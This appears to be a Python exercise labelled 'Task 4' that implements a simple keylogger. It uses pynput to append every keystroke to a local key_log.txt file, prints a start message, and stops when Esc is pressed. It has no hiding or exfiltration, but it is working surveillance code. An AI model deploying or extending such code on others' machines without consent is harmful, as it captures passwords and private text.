# Task 4

from pynput import keyboard

log_file = "key_log.txt"


def keyPressed(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char} ")
    except AttributeError:
        with open(log_file, "a") as f:
            key_name = key.name if hasattr(key, "name") else str(key)
            if key_name.startswith("Key."):
                key_name = key_name[4:]
            f.write(f"[{key_name}]\n")


def keyReleased(key):
    if key == keyboard.Key.esc:
        return False


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed, on_release=keyReleased)
    listener.start()
    print("Keylogger has started ...")
    try:
        listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
        listener.stop()
